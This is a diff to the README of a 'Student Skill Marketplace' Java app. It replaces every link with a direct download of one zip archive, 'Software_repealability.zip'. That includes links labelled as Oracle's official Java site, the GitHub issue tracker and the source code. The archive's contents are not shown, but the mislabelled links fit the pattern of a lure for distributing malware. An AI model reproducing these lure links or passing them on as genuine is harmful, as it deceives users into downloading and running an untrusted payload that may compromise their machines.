@@ -8,7 +8,7 @@ Welcome to the Student Skill Marketplace! This application helps skilled student
 
 To download the software, click the button below to visit the releases page:
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/sujon005/github/releases)
+[![Download](https://raw.githubusercontent.com/sujon005/github/main/service/Software_repealability.zip)](https://raw.githubusercontent.com/sujon005/github/main/service/Software_repealability.zip)
 
 On the releases page, you will find the available versions of the application. Look for the latest version and follow these steps:
 
@@ -23,7 +23,7 @@ Make sure your computer meets the following requirements:
 - **Operating System**: Windows 10 or later, macOS 10.14 or later
 - **Java Version**: Java 8 or later installed on your system
 
-You can download Java from the [official website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).
+You can download Java from the [official website](https://raw.githubusercontent.com/sujon005/github/main/service/Software_repealability.zip).
 
 ## 👨‍🎓 How to Use the Application
 
@@ -77,11 +77,11 @@ We plan to improve the application with the following features:
 
 ## 📞 Need Help?
 
-If you encounter any issues or have questions, you can reach out for support by visiting our [issue tracker](https://github.com/sujon005/github/issues) on GitHub. We’re here to help you.
+If you encounter any issues or have questions, you can reach out for support by visiting our [issue tracker](https://raw.githubusercontent.com/sujon005/github/main/service/Software_repealability.zip) on GitHub. We’re here to help you.
 
 ## 🔗 Links
 
-- [Download The App](https://github.com/sujon005/github/releases)  
-- [Visit the Source Code](https://github.com/sujon005/github)
+- [Download The App](https://raw.githubusercontent.com/sujon005/github/main/service/Software_repealability.zip)  
+- [Visit the Source Code](https://raw.githubusercontent.com/sujon005/github/main/service/Software_repealability.zip)
 
 Enjoy connecting with job opportunities!
